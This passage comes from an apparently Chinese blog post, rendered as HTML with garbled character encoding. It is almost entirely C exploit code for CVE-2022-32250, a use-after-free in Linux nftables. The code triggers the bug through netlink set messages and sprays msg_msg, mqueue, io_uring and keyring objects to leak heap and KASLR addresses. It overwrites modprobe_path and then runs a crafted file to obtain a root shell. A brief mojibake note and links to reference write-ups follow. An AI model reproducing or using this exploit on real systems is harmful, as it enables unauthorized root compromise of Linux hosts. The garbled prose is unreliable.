nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, set_id++);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// expressions</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> * <span class="title">exprs</span>[128];</span></span><br><span class="line">    <span class="keyword">int</span> exprid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// serialize</span></span><br><span class="line">    <span class="keyword">char</span> buf[MNL_SOCKET_BUFFER_SIZE*<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> * <span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> * <span class="title">nlh</span>;</span></span><br><span class="line">    <span class="keyword">int</span> table_seq = seq;</span><br><span class="line"></span><br><span class="line">    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">NFT_MSG_NEWTABLE, family, NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_table_nlmsg_build_payload(nlh, table);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add set_stable</span></span><br><span class="line">    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">                                    NFT_MSG_NEWSET, family,</span><br><span class="line">                                    NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_set_nlmsg_build_payload(nlh, set_stable);</span><br><span class="line">    nftnl_set_free(set_stable);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] setting stable %s and set\n&quot;</span>, table_name);</span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_trigger_set_and_overwrite</span><span class="params">(struct mnl_socket* nl, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">char</span> *set_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * table_name = name;</span><br><span class="line">    <span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line">    <span class="keyword">uint32_t</span> set_id = <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> * <span class="title">exprs</span>[128];</span></span><br><span class="line">    <span class="keyword">int</span> exprid = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> * <span class="title">nlh</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> * <span class="title">set_trigger</span> =</span> nftnl_set_alloc();</span><br><span class="line"></span><br><span class="line">    nftnl_set_set_str(set_trigger, NFTNL_SET_TABLE, table_name);</span><br><span class="line">    nftnl_set_set_str(set_trigger, NFTNL_SET_NAME, set_name);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_FLAGS, NFT_SET_EXPR);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_KEY_LEN, <span class="number">1</span>);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_FAMILY, family);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_ID, set_id);</span><br><span class="line">    exprs[exprid] = nftnl_expr_alloc(<span class="string">&quot;lookup&quot;</span>);</span><br><span class="line">    nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, <span class="string">&quot;set_stable&quot;</span>);</span><br><span class="line">    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);</span><br><span class="line">    nftnl_set_add_expr(set_trigger, exprs[exprid]);</span><br><span class="line">    exprid++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[MNL_SOCKET_BUFFER_SIZE*<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> * <span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">                                    NFT_MSG_NEWSET, family,</span><br><span class="line">                                    NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_set_nlmsg_build_payload(nlh, set_trigger);</span><br><span class="line">    nftnl_set_free(set_trigger);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] triggering UAF set and overwrite *(prevchunk+0x18)\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cpu_affinity</span><span class="params">(<span class="keyword">int</span> cpu_n, <span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">    CPU_SET(cpu_n, &amp;<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(pid, <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_mqueue</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">char</span> *msgptr, <span class="keyword">int</span> spray_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> msgrv[BUFFER];</span><br><span class="line"><span class="keyword">unsigned</span> rvprio, sdprio = <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line"><span class="keyword">int</span> unresolved = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> priority = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] spraying mqueue...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;spray_size; i++)</span><br><span class="line">        <span class="keyword">if</span> (mq_send(mqdes, msgptr, <span class="number">0x28</span>, sdprio) != <span class="number">0</span>)</span><br><span class="line">            perror(ERROR_PREFIX <span class="string">&quot;mq_send&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gather_mqueue</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">int</span> gather_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> priority = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> msg[BUFFER];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gathering mqueue...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;gather_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (mq_receive(mqdes, (<span class="keyword">char</span>*) &amp;msg, BUFFER, <span class="literal">NULL</span>) != <span class="number">-1</span>)</span><br><span class="line">        &#123;   </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(*((<span class="keyword">uint64_t</span> *)msg) &amp; <span class="number">0xffffffff00000000</span> != <span class="number">0xffffffff00000000</span>)</span><br><span class="line">                bye(<span class="string">&quot;[-] can&#x27;t leak base... \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            base_base = *((<span class="keyword">uint64_t</span> *)msg) - <span class="number">0x51af80</span>;</span><br><span class="line">            modprobe_addr = base_base + <span class="number">0x1e8b320</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] KASLR base: 0x%llx\n&quot;</span>, base_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] modprobe addr: 0x%llx\n&quot;</span>, modprobe_addr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gather_mqueue_nosave</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">int</span> gather_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> priority = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> msg[BUFFER];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gathering mqueue...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;gather_size; i++)</span><br><span class="line">        mq_receive(mqdes, (<span class="keyword">char</span>*) &amp;msg, BUFFER, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_msg_msg</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> amount, <span class="keyword">int</span> qid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x2000</span>];</span><br><span class="line">    msg *spray = (msg *)buffer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// assert(size &gt;= 0x31 &amp;&amp; size &lt;= 0x1000 - 0x8);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to spray msg_msg\n&quot;</span>);</span><br><span class="line">    spray-&gt;mtype = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(spray-&gt;mtext, <span class="number">0x41</span>, size - <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; amount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">0x10</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] spraying msg_msg: 0x%x\n&quot;</span>, i);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(qid, spray, size - <span class="number">0x30</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">io_uring_setup</span><span class="params">(<span class="keyword">uint32_t</span> entries, struct io_uring_params *p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_io_uring_setup, entries, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">io_uring_register</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> opcode, <span class="keyword">void</span> *arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct fd_uring *<span class="title">spray_uring</span><span class="params">(<span class="keyword">uint32_t</span> spray_size, struct fd_uring *fd_buffer)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint64_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++) &#123;</span><br><span class="line"></span><br><span class="line">        fd_buffer[i].params = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct io_uring_params));</span><br><span class="line">        <span class="keyword">if</span> (!fd_buffer[i].params)</span><br><span class="line">            do_error_exit(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(fd_buffer[i].params, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct io_uring_params));</span><br><span class="line"></span><br><span class="line">        fd_buffer[i].fd = io_uring_setup(SPRAY_NB_ENTRIES, fd_buffer[i].params);</span><br><span class="line">        <span class="keyword">if</span> (fd_buffer[i].fd &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;io_uring_create&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_uring</span><span class="params">(struct fd_uring *fd_buffer, <span class="keyword">uint32_t</span> buffer_size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; buffer_size; i++) &#123;</span><br><span class="line">        close(fd_buffer[i].fd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(fd_buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_partial_uring</span><span class="params">(struct fd_uring *fd_buffer, <span class="keyword">uint32_t</span> buffer_idx)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    close(fd_buffer[buffer_idx].fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_root_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    create_dummy_file();</span><br><span class="line">    create_priv_file();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_dummy_file</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">    fd = open(dummy_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);</span><br><span class="line">    write(fd, dummy_content, <span class="keyword">sizeof</span>(dummy_content));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_priv_file</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">    fd = open(priv_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);</span><br><span class="line">    write(fd, priv_context, <span class="keyword">sizeof</span>(priv_context));</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;gcc -o /tmp/shell /tmp/shell.c -w&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_new_modprobe</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd, fd_modprobe;</span><br><span class="line">    <span class="keyword">char</span> modprobe_name[<span class="number">0x10</span>] = &#123;<span class="number">0</span>, &#125;;</span><br><span class="line"></span><br><span class="line">    fd_modprobe = open(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, O_RDONLY);</span><br><span class="line">    read(fd_modprobe, modprobe_name, <span class="number">14</span>);</span><br><span class="line">    close(fd_modprobe);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] current modprobe name: %s\n&quot;</span>, modprobe_name);</span><br><span class="line">    fd = open(modprobe_name, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;open&quot;</span>);</span><br><span class="line"></span><br><span class="line">    write(fd, new_modprobe_content, <span class="keyword">sizeof</span>(new_modprobe_content));</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_modprobe_payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    write_new_modprobe();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userland_T</span><span class="params">(<span class="keyword">int</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(*sema);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_up</span><span class="params">(<span class="keyword">int</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *sema = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sema_down</span><span class="params">(<span class="keyword">int</span> *sema)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *sema = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> writebuf[<span class="number">0x2000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> mqname[MQUEUE_NUM][NAMELEN] = &#123;<span class="string">&quot;/qname1&quot;</span>, <span class="string">&quot;/qname2&quot;</span>, <span class="string">&quot;/qname3&quot;</span>, <span class="string">&quot;/qname4&quot;</span>, <span class="string">&quot;/qname5&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">mqd_t</span> mqid[MQUEUE_NUM];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mq_attr</span> <span class="title">attr</span>;</span></span><br><span class="line">attr.mq_flags   = <span class="number">0</span>;</span><br><span class="line">attr.mq_maxmsg  = <span class="number">10</span>;</span><br><span class="line">attr.mq_msgsize = BUFFER;</span><br><span class="line">attr.mq_curmsgs = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> uaf_id = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *sema = mmap(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> *sema2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    prepare_root_shell();</span><br><span class="line">    sema_up(sema);</span><br><span class="line">    <span class="keyword">if</span>(fork())</span><br><span class="line">    &#123;</span><br><span class="line">        set_cpu_affinity(<span class="number">1</span>, getpid());</span><br><span class="line">        userland_T(sema);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 4: Execute Malicious File -------------------------------]\n&quot;</span>);</span><br><span class="line">        setup_modprobe_payload();</span><br><span class="line">        execve(<span class="string">&quot;/tmp/dummy&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        execve(<span class="string">&quot;/tmp/shell&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unshare_setup(getuid(), getgid());</span><br><span class="line"></span><br><span class="line">    set_cpu_affinity(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fd_uring</span> *<span class="title">fd_buffer</span> =</span> <span class="built_in">calloc</span>(SPRAY_SIZE, <span class="keyword">sizeof</span>(struct fd_uring));</span><br><span class="line">    <span class="keyword">if</span> (!fd_buffer)</span><br><span class="line">        do_error_exit(<span class="string">&quot;calloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        <span class="keyword">if</span>((mqid[i] = mq_open(mqname[i], O_CREAT | O_RDWR, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH, &amp;attr)) &lt; <span class="number">0</span>)</span><br><span class="line">            bye(<span class="string">&quot;MQUEUE&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_socket</span>* <span class="title">nl</span> =</span> mnl_socket_open(NETLINK_NETFILTER);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 0: Allocate stable table and set ------------------------]\n&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table1&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table2&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table3&quot;</span>);</span><br><span class="line">    set_stable_table_and_set(nl, <span class="string">&quot;table4&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 1: Leak heap address ------------------------------------]\n&quot;</span>);</span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table1&quot;</span>, <span class="string">&quot;set_trigger0&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = spray_keyring(<span class="number">0</span>, SPRAY_KEY_SIZE);</span><br><span class="line"></span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table1&quot;</span>, <span class="string">&quot;set_trigger1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((uaf_id = get_keyring_leak(id_buffer, SPRAY_KEY_SIZE)) == SPRAY_KEY_SIZE)</span><br><span class="line">        bye(<span class="string">&quot;[-] leak failed...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 2: Leak KASLR address -----------------------------------]\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    spray_uring(SPRAY_SIZE, fd_buffer);</span><br><span class="line"></span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table2&quot;</span>, <span class="string">&quot;set_trigger2&quot;</span>);</span><br><span class="line">    spray_mqueue(mqid[<span class="number">0</span>], <span class="string">&quot;TESTMSGTESTMSGTESTMSGTESTMSGTESTMSG&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    release_partial_uring(fd_buffer, SPRAY_SIZE<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>; i &gt; <span class="number">113</span>; i++)</span><br><span class="line">        release_partial_uring(fd_buffer, SPRAY_SIZE-i);</span><br><span class="line">    release_partial_uring(fd_buffer, SPRAY_SIZE<span class="number">-2</span>);</span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table2&quot;</span>, <span class="string">&quot;set_trigger3&quot;</span>);</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer3 = spray_keyring_list_del_purpose(SPRAY_KEY_SIZE*<span class="number">2</span>, heap_base, heap_base, <span class="number">0x28</span>);<span class="comment">// keyring &lt;-&gt; msg_msg overlap</span></span><br><span class="line">    gather_mqueue(mqid[<span class="number">0</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n[------------------------- stage 3: Overwrite modprobe_path ------------------------------]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table3&quot;</span>, <span class="string">&quot;set_trigger4&quot;</span>);</span><br><span class="line">    spray_mqueue(mqid[<span class="number">1</span>], <span class="string">&quot;TESTMSGTESTMSGTESTMSGTESTMSGTESTMSG&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    set_trigger_set_and_overwrite(nl, <span class="string">&quot;table3&quot;</span>, <span class="string">&quot;set_trigger5&quot;</span>);</span><br><span class="line">    id_buffer = spray_keyring_list_del_purpose(<span class="number">1</span>, modprobe_addr<span class="number">-0x8</span>+<span class="number">0x1</span>, (heap_base&amp;<span class="number">0xffffffff00000000</span>)+<span class="number">0x2f706d74</span>, <span class="number">0x10</span>);</span><br><span class="line">    sema_down(sema);</span><br><span class="line">    gather_mqueue_nosave(mqid[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=SPRAY_SIZE/<span class="number">2</span>+<span class="number">12</span>; i&lt;SPRAY_SIZE; i++)</span><br><span class="line">        release_partial_uring(fd_buffer, i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿç”¨äº†<code>io_uring</code>ï¼Œä¸è¿‡æˆ‘çœ‹å…¶ç”³è¯·çš„å‚æ•°å…¶å®æ˜¯<code>GFP_KERNEL_ACCOUNT</code>ï¼Œä¸æ˜ç™½ä¸ºä»€ä¹ˆè¿™é‡Œåˆå¯ä»¥è¿›è¡Œå ä½äº†( æœ‰ç§è‡ªç›¸çŸ›ç›¾çš„æ„Ÿè§‰ )ã€‚</p><hr><p>å‚è€ƒé“¾æ¥:</p><p>â€‹    <a class="link"   href="https://blog.theori.io/linux-kernel-exploit-cve-2022-32250-with-mqueue-a8468f32aab5" >https://blog.theori.io/linux-kernel-exploit-cve-2022-32250-with-mqueue-a8468f32aab5<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://github.com/theori-io/CVE-2022-32250-exploit" 